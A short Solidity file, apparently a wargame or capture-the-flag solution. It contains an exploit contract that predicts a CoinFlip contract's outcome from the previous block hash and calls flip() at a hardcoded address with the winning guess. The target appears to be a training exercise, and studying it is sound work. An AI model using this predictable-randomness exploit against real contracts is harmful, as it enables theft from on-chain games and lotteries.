// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.0 <0.9.0;

contract CoinFlip {
    function flip(bool) public returns (bool) {}
    
    function consecutiveWins() public pure returns (uint256) {}
}

contract CoinFlipGuesser {
    
    CoinFlip coinFlipContract;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address COIN_FLIP_CONTRACT_ADDRESS = 0x89acEF64093755Aff47982e756898119a6eeb561;
    
    constructor() {
        coinFlipContract = CoinFlip(COIN_FLIP_CONTRACT_ADDRESS);
    }
    
    function flipWithPerfectGuess() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
    
        if (lastHash == blockValue) {
          revert();
        }
    
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        
        bool guess = coinFlip == 1 ? true : false;
        
        return coinFlipContract.flip(guess);
    }
}